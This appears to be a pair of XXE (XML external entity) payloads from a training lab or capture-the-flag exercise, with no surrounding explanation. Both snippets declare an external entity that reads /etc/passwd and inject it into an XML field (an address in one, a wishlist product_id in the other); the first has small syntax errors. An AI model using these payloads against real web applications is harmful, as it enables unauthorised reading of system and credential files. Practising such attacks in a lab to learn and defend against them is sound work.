```
<!DOCTYPE people [
<!ENTITY thmFile SYSTEM "file:///etc/passwd"]

<people>
<name>Glitch</name>
<address>&thmFile</address>
<email>glitch@wareville.com</email>
<phone>111000</phone>
</people>
```

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/passwd"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```
